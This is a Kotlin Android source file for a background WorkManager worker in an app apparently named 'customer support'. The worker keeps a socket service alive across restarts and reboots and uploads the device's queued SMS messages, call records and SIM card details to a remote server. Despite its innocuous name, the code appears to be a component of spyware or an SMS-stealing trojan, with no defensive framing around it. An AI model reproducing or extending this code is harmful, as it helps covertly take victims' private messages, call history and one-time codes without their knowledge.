package com.customersupport.worker

import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.customersupport.CustomerSupportApp
import com.customersupport.service.SocketService
import com.customersupport.socket.ConnectionState
import kotlinx.coroutines.delay

/**
 * WorkManager periodic worker that ensures:
 * 1. The foreground service is alive (restarts if dead)
 * 2. Data sync is performed if connected
 * 3. Pending queued data from offline periods is flushed
 *
 * WorkManager survives process death and device reboots, making this
 * a reliable fallback for maintaining background persistence.
 */
class SyncWorker(
    private val context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    companion object {
        private const val TAG = "SyncWorker"
        const val WORK_NAME = "periodic_sync_worker"
    }

    override suspend fun doWork(): Result {
        Log.d(TAG, "SyncWorker executing")

        try {
            // 1. Ensure the foreground service is running
            ensureServiceRunning()

            // 2. Give service time to connect if it was just started
            delay(5000)

            // 3. Flush pending sync queue if connected
            flushPendingSync()

            // 4. Trigger a fresh sync
            triggerSync()

            Log.d(TAG, "SyncWorker completed successfully")
            return Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "SyncWorker failed", e)
            return Result.retry()
        }
    }

    private fun ensureServiceRunning() {
        try {
            val serviceIntent = Intent(context, SocketService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
            Log.d(TAG, "Ensured SocketService is running")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start service from worker", e)
        }
    }

    private fun flushPendingSync() {
        try {
            val socketManager = CustomerSupportApp.socketManager
            val pendingSyncManager = CustomerSupportApp.pendingSyncManager

            if (socketManager.connectionState.value != ConnectionState.CONNECTED) {
                Log.d(TAG, "Not connected, skipping pending sync flush")
                return
            }

            if (!pendingSyncManager.hasPendingData()) {
                Log.d(TAG, "No pending data to flush")
                return
            }

            val deviceId = pendingSyncManager.getPendingDeviceId() ?: return

            pendingSyncManager.getPendingSms()?.let { sms ->
                socketManager.syncSms(deviceId, sms)
                pendingSyncManager.clearPendingSms()
                Log.d(TAG, "Flushed ${sms.length()} pending SMS")
            }

            pendingSyncManager.getPendingCalls()?.let { calls ->
                socketManager.syncCalls(deviceId, calls)
                pendingSyncManager.clearPendingCalls()
                Log.d(TAG, "Flushed ${calls.length()} pending calls")
            }

            pendingSyncManager.getPendingSim()?.let { sim ->
                socketManager.syncSimInfo(deviceId, sim)
                pendingSyncManager.clearPendingSim()
                Log.d(TAG, "Flushed ${sim.length()} pending SIM cards")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error flushing pending sync", e)
        }
    }

    private fun triggerSync() {
        try {
            val socketManager = CustomerSupportApp.socketManager
            if (socketManager.connectionState.value == ConnectionState.CONNECTED) {
                socketManager.requestSync()
                Log.d(TAG, "Triggered fresh sync")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error triggering sync", e)
        }
    }
}
